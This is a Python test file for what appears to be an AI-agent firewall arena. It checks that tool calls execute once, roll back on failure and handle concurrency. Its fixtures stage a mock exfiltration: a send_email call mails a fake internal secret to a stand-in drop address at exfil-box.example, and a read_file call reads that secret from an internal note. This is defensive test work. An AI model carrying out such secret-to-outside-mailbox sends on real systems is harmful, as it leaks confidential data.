"""M2 B-05 tool execution on the database (spec AEGIS-DOM-109; PRD §7.6, §15.1).

Cases: M2-X11 (a recorded call_id never executes twice), M2-X12 (a failure commits neither the
state change nor the event), concurrency on one session, and the Off demo read.
"""

from __future__ import annotations

import asyncio
from typing import Any

import pytest
from sqlalchemy import text
from sqlalchemy.ext.asyncio import AsyncEngine

from app.arena.scenario_data import SYSTEM_PROMPT, TOOLS
from app.arena.seed import DEFAULT_WEIGHTS, STRICT_THRESHOLDS, build_mock_state
from app.contracts.fakes import InMemoryRiskyHistory, StubJudge
from app.contracts.firewall import AgentDefinition, LevelConfig, RegisterSession, ToolDef
from app.firewall.canonical import CanonicalCall, canonicalize
from app.firewall.events import EventRow, insert_event
from app.firewall.seed import seed
from app.firewall.sessions import register_session
from app.firewall.tool_exec import execute_tool

SECRET = "INTNOTE-K3Q9ZP7X2M4TLW8D5RHV6BNA"
MAILBOX = "drop@exfil-box.example"
DEFS = [
    ToolDef(name=t["name"], json_schema=t["json_schema"], high_risk=t["high_risk"]) for t in TOOLS
]


async def _session(engine: AsyncEngine) -> tuple[str, str]:
    await seed(engine)
    async with engine.begin() as conn:
        owner = str(
            (
                await conn.execute(
                    text(
                        "INSERT INTO users (auth0_sub, role) VALUES ('auth0|tx', 'student')"
                        " RETURNING id"
                    )
                )
            ).scalar_one()
        )
    req = RegisterSession(
        owner_ref=owner,
        agent=AgentDefinition(system_prompt=SYSTEM_PROMPT, tools=DEFS, model_id="gemini-test"),
        level=LevelConfig(
            level_id="lvl-1",
            level_version=1,
            mode="off",
            rule_version=0,
            weights=DEFAULT_WEIGHTS,
            thresholds=STRICT_THRESHOLDS,
            divert_enabled=False,
        ),
        secret=SECRET,
        mock_state_seed=build_mock_state("lvl-1", SECRET),
    )
    handle = await register_session(engine, req, InMemoryRiskyHistory(), StubJudge())
    return handle.fw_session_id, owner


def _call(tool: str, call_id: str = "c1", **args: Any) -> CanonicalCall:
    result = canonicalize(tool, args, DEFS, call_id=call_id)
    assert isinstance(result, CanonicalCall), result
    return result


async def _count(engine: AsyncEngine, sql: str, **params: Any) -> int:
    async with engine.connect() as conn:
        return int((await conn.execute(text(sql), params)).scalar_one())


async def _emails(engine: AsyncEngine, sid: str) -> int:
    return await _count(
        engine, "SELECT jsonb_array_length(emails) FROM fw_mock_state WHERE fw_session_id = :s",
        s=sid,
    )  # fmt: skip


MAIL = {"to": MAILBOX, "subject": "Latest notes", "body": f"Note: {SECRET}"}


async def test_send_email_is_recorded_and_visible(engine: AsyncEngine) -> None:
    sid, _ = await _session(engine)
    before = await _emails(engine, sid)
    async with engine.begin() as conn:
        out = await execute_tool(conn, sid, "m1", _call("send_email", **MAIL))
    assert (out.replayed, out.result) == (False, f"Email sent to {MAILBOX}.")
    assert out.visible_content is not None and SECRET in out.visible_content
    assert await _emails(engine, sid) == before + 1
    executed = "SELECT count(*) FROM fw_tool_calls WHERE fw_session_id = :s AND state = 'executed'"
    assert await _count(engine, executed, s=sid) == 1


async def test_m2x11_a_recorded_call_id_never_executes_twice(engine: AsyncEngine) -> None:
    sid, _ = await _session(engine)
    before = await _emails(engine, sid)
    for _ in range(2):
        async with engine.begin() as conn:
            out = await execute_tool(conn, sid, "m1", _call("send_email", **MAIL))
    assert out.replayed is True
    assert out.visible_content is not None  # the replay shows the same effect
    assert await _emails(engine, sid) == before + 1


async def test_m2x12_failure_commits_neither_effect_nor_event(engine: AsyncEngine) -> None:
    sid, owner = await _session(engine)
    before = await _emails(engine, sid)
    with pytest.raises(RuntimeError):
        async with engine.begin() as conn:
            await execute_tool(conn, sid, "m1", _call("send_email", **MAIL))
            await insert_event(
                conn,
                EventRow(fw_session_id=sid, user_id=owner, message_id="m1", manifest_id="man-x",
                         level_id="lvl-1", mode="off", stage="tool_executed",
                         source_trust="bot_output", decision="allow", execution_status="executed",
                         sentinel_score=0, score_breakdown={}, thresholds_used={}),
            )  # fmt: skip
            raise RuntimeError("DB error while writing the turn")
    assert await _emails(engine, sid) == before
    assert await _count(engine, "SELECT count(*) FROM fw_tool_calls WHERE fw_session_id = :s",
                        s=sid) == 0  # fmt: skip
    assert await _count(engine, "SELECT count(*) FROM fw_events WHERE fw_session_id = :s",
                        s=sid) == 0  # fmt: skip


async def test_concurrent_executions_of_one_call_run_once(engine: AsyncEngine) -> None:
    sid, _ = await _session(engine)
    before = await _emails(engine, sid)

    async def run() -> bool:
        async with engine.begin() as conn:
            return (await execute_tool(conn, sid, "m1", _call("send_email", **MAIL))).replayed

    replays = await asyncio.gather(run(), run(), run())
    assert sorted(replays) == [False, True, True]
    assert await _emails(engine, sid) == before + 1


async def test_off_demo_read_of_the_holder_file(engine: AsyncEngine) -> None:
    sid, _ = await _session(engine)
    async with engine.begin() as conn:
        out = await execute_tool(conn, sid, "m1", _call("read_file", path="docs/internal-note.md"))
    assert SECRET in out.result and out.visible_content is None


async def test_unknown_session_is_an_error(engine: AsyncEngine) -> None:
    async with engine.begin() as conn:
        with pytest.raises(LookupError):
            await execute_tool(conn, "fws-missing", "m1", _call("search_docs", query="q"))
